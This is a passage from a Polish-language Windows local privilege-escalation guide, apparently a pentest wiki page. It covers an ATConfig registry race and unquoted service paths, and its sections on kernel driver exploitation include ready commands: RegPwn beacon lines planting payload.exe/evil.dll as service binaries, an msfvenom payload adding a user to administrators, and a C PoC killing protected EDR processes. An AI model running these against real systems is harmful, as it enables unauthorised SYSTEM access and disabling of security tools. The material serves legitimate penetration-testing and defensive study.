reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig dowiązania symbolicznego w rejestrze prowadzący do zapisu dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Wyścig dowiązania symbolicznego** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając możliwość zapisu **dowolnej wartości** w HKLM.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje konfigurację kontrolowaną przez użytkownika.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania lub przejść do bezpiecznego pulpitu i można go zapisywać jako użytkownik.

Przebieg nadużycia (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą SYSTEM ma zapisać.
2. Wywołaj kopiowanie do bezpiecznego pulpitu (np. **LockWorkstation**), co uruchamia przepływ AT broker.
3. **Wygraj wyścig**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy zadziała oplock, zastąp klucz **HKLM Session ATConfig** **dowiązaniem rejestru** wskazującym chroniony cel HKLM.
4. SYSTEM zapisze wybraną przez atakującego wartość w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM przejdź do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (plik EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / samodzielne narzędzie):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz te uprawnienia do rejestru, oznacza to, że **możesz tworzyć podrejestry w jego obrębie**. W przypadku usług Windows **wystarczy to do wykonania dowolnego kodu:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje uruchomić każdą możliwą ścieżkę kończącą się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wyświetl wszystkie ścieżki usług nieujęte w cudzysłowy, z wyłączeniem ścieżek usług wbudowanych w system Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę podatność za pomocą Metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą Metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Akcje odzyskiwania

Windows pozwala użytkownikom określać akcje, które mają zostać wykonane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, możliwa jest privilege escalation. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Cele skryptów zadań zaplanowanych

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź skrypt wskazany w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShellu. Jeśli zaplanowany plik wsadowy zawiera bezpośrednie wywołanie PowerShella z `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń wymagają ręcznego prześledzenia. Skrypt lub katalog nadrzędny, do którego wywołujący ma prawo zapisu, stanowi wskazówkę do cross-account execution tylko wtedy, gdy skonfigurowany principal zadania różni się od konta wywołującego, a zadanie faktycznie dociera do tej akcji. ACL zezwalający wyłącznie na dopisywanie może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania może sprawić, że dopisane linie nie zostaną wykonane. Przed stwierdzeniem, że możliwa jest privilege escalation, potwierdź efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz oraz zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Nazwane strumienie w dostępnych plikach

W NTFS plik z prawem odczytu może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna na zwykłej liście katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem zawartości sprawdź **nazwy i rozmiary** strumieni; Windows udostępnia je przez [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz PowerShellowe [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu to tylko wskazówka. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz konto, na które faktycznie się uwierzytelniają. Podczas rutynowej enumeracji unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Dane wejściowe pomocnika Windows Driver Kit używanego przez zadanie zaplanowane

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może odczytywać pliki `command.txt`, `reboot.rsf` oraz plik projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zadanie zaplanowane lub usługa uruchamiająca ten pomocnik z kontem o wysokich uprawnieniach może wykorzystać dostęp do zapisu dla użytkownika z niskimi uprawnieniami do tych plików wejściowych, aby uruchomić polecenia w kontekście tego konta — nawet jeśli sam plik wykonywalny pomocnika jest chroniony. Potwierdź, że odbiorca danych ma wysokie uprawnienia i że można utworzyć lub zmodyfikować **oba** pliki towarzyszące; samo znalezienie pomocnika nie wystarczy.

W przypadku zadania zaplanowanego sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) oraz ACL obu ścieżek do plików towarzyszących. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest jedynie wskazówką do zweryfikowania, a nie dowodem na to, skąd zadanie odczytuje dane wejściowe. Musi być również spełniony wymóg obecności pliku roboczego projektu. Sprawdź rzeczywisty principal zadania, zamiast zakładać, że jest nim SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (może da się któryś nadpisać i uzyskać privilege escalation) oraz **katalogów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk dla Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie — gdy zastąpienie pliku się nie powiodło — wykonywały istniejący wcześniej plik chroniony przed zapisem. Producent naprawił problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny zainstalowany poziom poprawek i to, czy może zostać uruchomiona operacja agenta, której dotyczy problem; sama etykieta gałęzi, taka jak `2.1`, nie pozwala ustalić, czy system jest podatny. Podczas enumeracji można sprawdzić wersję, stan usługi i uprawnienia do Temp bez tworzenia plików ani uruchamiania poleceń agenta.

#### Przegląd usługi SAML ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyło ADSelfService Plus w kompilacji 6210 i wcześniejszych; producent naprawił problem w kompilacji 6211. Ma ono znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis dotyczący zainstalowanego produktu lub ścieżka usługi to zatem wskazówka, a nie potwierdzenie podatności: sprawdź dokładną kompilację, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu za pośrednictwem usługi odbywa się z uprawnieniami tego konta; uruchomienie z uprawnieniami SYSTEM wymaga instancji działającej jako SYSTEM. Możliwy do odczytania plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępność użytecznych danych logowania ani na tę lukę w SAML. Podczas rutynowej enumeracji zanotuj jego ścieżkę i prawa dostępu, ale go nie rozpakowuj.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins dla Windows odróżniaj uprawnienie do utworzenia lub skonfigurowania zadania od uprawnienia do jego uruchomienia: [Jenkins opisuje je jako oddzielne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalne wyzwalanie może zapewniać inną drogę uruchomienia kompilacji, ale potwierdź, że jest włączona i że kompilacja faktycznie się uruchamia. Kod działa z tożsamością kontrolera lub wybranego agenta, a zapisane dane logowania są użyteczne tylko wtedy, gdy zadanie ma dostęp do ich zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane logowania i klucze szyfrujące w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów w Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; zweryfikuj **prawo odczytu wymaganych plików** oraz odrębną ścieżkę ponownego użycia konta, nie wypisując sekretów we współdzielonych wynikach. Jeśli to konto ma prawo zapisu do atrybutu obiektu użytkownika AD `scriptPath`, przed uznaniem tego za wykonanie między użytkownikami potwierdź, że ścieżka skryptu jest zapisywalna, a rzeczywisty proces logowania lub harmonogramu uruchamia ją jako użytkownik docelowy. Dalsza kontrola grup wymaga osobnej weryfikacji efektywnych uprawnień AD.

#### Tożsamość agenta Azure Pipelines self-hosted

W projekcie Azure DevOps Server lub Azure Pipelines odróżniaj uprawnienie do **utworzenia lub edycji** pipeline od uprawnienia do jego **umieszczenia w kolejce** i korzystania z wybranej puli agentów; [Microsoft opisuje niezależnie uprawnienia pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Jeśli konto z niższymi uprawnieniami może przesłać krok skryptu i uruchomić ten pipeline na self-hosted agencie Windows, krok zostanie wykonany jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Przed stwierdzeniem przejścia między użytkownikami lub uzyskania uprawnień SYSTEM zweryfikuj konkretny pipeline, ograniczenia dotyczące gałęzi i zasobów, autoryzowaną pulę, zadanie możliwe do uruchomienia oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub samo prawo zapisu do repozytorium to tylko wskazówki; podczas pasywnej enumeracji sprawdzaj uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Dane logowania Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, na którym działa usługa synchronizacji i które uzyskuje dostęp do jej bazy danych SQL, od **konta łącznika AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Dane logowania łącznika są przechowywane w tej bazie w postaci zaszyfrowanej, a materiał kluczowy jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, grupa o nazwie sugerującej uprawnienia administratora lokalnego lub widoczność bazy danych nie potwierdzają, że można odszyfrować dane logowania ani uzyskać uprawnienia w domenie. Osobno sprawdź rzeczywiste prawa odczytu bazy danych, dostęp do konta usługi i klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia AD tej tożsamości. Rutynowa enumeracja powinna ujawniać wyłącznie metadane usługi i dostępu, a nie odpytywać ani wypisywać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługujących sterowniki drukarek

Zainstalowany sterownik drukarki może przechowywać biblioteki DLL obsługujące jego działanie w `C:\ProgramData` i ładować je w procesie o wyższych uprawnieniach obsługującym drukowanie. Sprawdź uprawnienia ACL dokładnego katalogu sterownika i bibliotek DLL, w tym katalogów nadrzędnych i punktów ponownej analizy, nawet jeśli enumeracja WMI drukarek jest zablokowana. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) zgłoszona ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [pierwotny opis problemu](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapisywalne uprawnienia ACL to tylko wskazówka: sprawdź efektywne prawo zapisu z uwzględnieniem wpisów odmowy, czy odpowiedni sterownik jest zainstalowany i ładuje plik z uprawnieniami uprzywilejowanej tożsamości oraz czy producent naprawił instalację w zaktualizowanym sterowniku lub programie zabezpieczającym. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu lub wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować plik konfiguracyjny, aby odczytać jakiś specjalny plik, albo czy możesz zmodyfikować plik binarny uruchamiany przez konto Administratora (schedtasks).

Sposobem na znalezienie w systemie słabych uprawnień do folderów i plików jest:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Trwałość/wykonywanie przy automatycznym ładowaniu pluginów Notepad++

Notepad++ automatycznie ładuje wszystkie biblioteki DLL pluginów znajdujące się w podfolderach `plugins`. Jeśli dostępna jest instalacja przenośna/kopia z prawami do zapisu, umieszczenie w niej złośliwego pluginu zapewnia automatyczne wykonanie kodu w procesie `notepad++.exe` przy każdym uruchomieniu (w tym z poziomu `DllMain` i callbacków pluginu).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś wpis rejestru lub plik binarny, który będzie uruchamiany przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Poszukaj potencjalnie **podejrzanych/podatnych** sterowników firm trzecich.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli sterownik udostępnia prymityw dowolnego odczytu/zapisu pamięci jądra (częsty problem w źle zaprojektowanych procedurach obsługi IOCTL), możesz eskalować uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci jądra.<sup>[[13]](#references)</sup> Instrukcję krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

W przypadku błędów race condition, w których podatne wywołanie otwiera kontrolowaną przez atakującego ścieżkę Object Managera, celowe spowalnianie wyszukiwania (za pomocą komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF w cancel-safe queue, ujawnienia paged-pool i pivoty I/O ring

Niektóre łańcuchy Windows kernel LPE można zbudować z dwóch osobno mało groźnych błędów: **wyścigu cyklu życia cancel-safe queue**, który zwalnia żądanie/CBD, gdy blokada kolejki jest nadal zajęta, oraz ujawnienia typu **lock-release-before-copy**, które ujawnia zwolnioną alokację paged-pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i wykorzystania:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki powodzenia wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka powodzenia dociera do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolniony `PFLT_CALLBACK_DATA` do funkcji zwrotnej sterownika obsługującej usuwanie.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą kontrolowanej przez atakującego alokacji paged-pool o tym samym rozmiarze. Wpisy kolejki danych `NPFS` są przydatne, ponieważ ich zawartość i rozmiar można kontrolować, a później sprawdzać za pomocą operacji odczytu/podglądu potoku. Jeśli zwolniony obiekt zawiera wskaźniki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci użytkownika**, aby sterownik wielokrotnie przetwarzał zdefiniowane przez atakującego struktury żądań zamiast zatrzymać się na oryginalnym początku listy.
- **Ulepsz przewidywalny zapis**: jeśli fałszywe żądanie przekierowuje zagnieżdżony wskaźnik kontekstu używany przez zapisy księgowe (znaczniki czasu / QPC / pola sąsiadujące z licznikiem odwołań), możesz uzyskać zapis do kontrolowanego adresu, ale z niekontrolowaną wartością. W takim przypadku za cel wybierz pole **length/size** obiektu ze spryskanego puli, a nie końcowy wskaźnik kodu/danych, a następnie przeszukaj spryskaną pulę, aż uszkodzony obiekt umożliwi **odczyt paged-pool poza zakresem**.
- **Wzorzec ujawnienia podatny na race condition**: każdy syscall wykonujący `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność wzrasta, gdy atakujący może zwiększyć kopiowany bufor (na przykład przez dodanie wielu wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie wydłuża okno podmiany bez konieczności awarii systemu.
- **Cele ponownego wypełnienia bogate we wskaźniki**: zarejestrowane tablice buforów Windows **I/O ring** są doskonałymi celami ujawnienia, ponieważ ich rozmiar paged-pool jest kontrolowany przez atakującego (`8 * regBufferCnt`), a każdy element jest wskaźnikiem jądra do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odzyskaj otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring korzystały z podrobionych przez atakującego wpisów i zapewniały dowolny odczyt/zapis pamięci jądra. Jeśli jedyny dostępny zapis daje stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby utworzyć wskaźnik użytkownika z powtarzającymi się bajtami, taki jak `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam podrobioną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki podczas debugowania:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Po uzyskaniu dowolnego odczytu/zapisu do kernelu za pośrednictwem uszkodzonego I/O ringa ukradnij token SYSTEM, stosując standardowy workflow po uzyskaniu primitive’a:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives korupcji pamięci hive rejestru

Współczesne podatności hive umożliwiają przygotowanie deterministycznych układów pamięci, nadużywanie zapisywalnych elementów potomnych HKLM/HKU oraz przekształcenie korupcji metadanych w przepełnienia kernelowego paged pool bez niestandardowego sterownika. Pełny łańcuch opisano tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomieszanie typów w trybie direct funkcji `RtlQueryRegistryValues` z użyciem ścieżek kontrolowanych przez atakującego

Niektóre sterowniki przyjmują ścieżkę rejestru z przestrzeni użytkownika, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT` i przekazują jako cel skalarną zmienną na stosie, taką jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowany zgodnie z **rzeczywistym** typem wartości w rejestrze, a nie typem oczekiwanym przez programistę.

Daje to dwa przydatne primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala sterownikowi odpytywać wybrane przez atakującego klucze, ujawniać ich istnienie za pomocą kodów zwrotnych/logów, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci kernelu**: skalarne miejsce docelowe, takie jak `&readValue`, może zostać błędnie zinterpretowane jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze — zależnie od typu wartości w rejestrze.

Uwagi dotyczące praktycznej eksploatacji:

- **Mitigacja w Windows 8+**: jeśli zapytanie dotyczy **niezaufanego hive** i używa `RTL_QUERY_REGISTRY_DIRECT`, ale nie `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z kernelu kończą się awarią `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość eksploatacji, szukaj **kluczy zapisywalnych przez atakującego w zaufanych hive systemu**, zamiast umieszczać wartości w `HKCU`.
- **Umieszczanie danych w zaufanym hive**: użyj NtObjectManager do wyliczenia zapisywalnych elementów potomnych `\Registry\Machine`, a następnie ponownie uruchom skanowanie z użyciem zduplikowanego tokenu **o niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandboxowanych:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callbacku/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni wymaga, aby `EntryContext` wskazywał na `UNICODE_STRING`. Jeśli kod najpierw wczytuje kontrolowany przez atakującego `REG_DWORD` do skalarnej zmiennej na stosie, a następnie ponownie używa tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, co pozwala na częściowo kontrolowany zapis w kernelu.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi ujemną wartość kontrolowaną przez atakującego w ponownie użytym skalarze, kolejne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich pól na stosie. To często najprostsza droga do pełnego nadpisania wskaźnika callbacku.

Przydatny wzorzec do wyszukiwania: **niejednorodne odczyty rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Wyszukuj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używane wskaźniki `EntryContext` oraz ścieżki kodu, w których pierwszy odczyt z rejestru decyduje o wykonaniu drugiego.

#### Nadużycie braku FILE_DEVICE_SECURE_OPEN na obiektach urządzeń (LPE + wyłączenie EDR)

Niektóre podpisane sterowniki firm trzecich tworzą obiekt urządzenia z restrykcyjnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna DACL nie jest egzekwowana, gdy urządzenie otwierane jest za pomocą ścieżki zawierającej dodatkowy komponent. Dzięki temu każdy nieuprzywilejowany użytkownik może uzyskać uchwyt, używając ścieżki przestrzeni nazw takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, może nadużyć uprzywilejowanych IOCTL udostępnianych przez sterownik do LPE i manipulacji systemem. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokenu / powłoka SYSTEM za pomocą DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony odczyt/zapis surowego dysku (modyfikacje offline, sztuczki z utrwaleniem podczas rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co pozwala wyłączać AV/EDR z przestrzeni użytkownika za pośrednictwem kernela.

Minimalny schemat PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Środki zaradcze dla developerów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone za pomocą DACL.
- Weryfikuj kontekst wywołującego w przypadku uprzywilejowanych operacji. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ograniczaj IOCTLs (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ użycie modeli brokerowanych zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie z trybu użytkownika podejrzanych nazw urządzeń (np. \\ .\\amsdk*) oraz określone sekwencje IOCTL wskazujące na nadużycia.
- Wymuszaj stosowanie listy zablokowanych podatnych sterowników firmy Microsoft (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych/zablokowanych.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się w PATH**, możesz przejąć kontrolę nad biblioteką DLL ładowaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów w PATH:

```bash
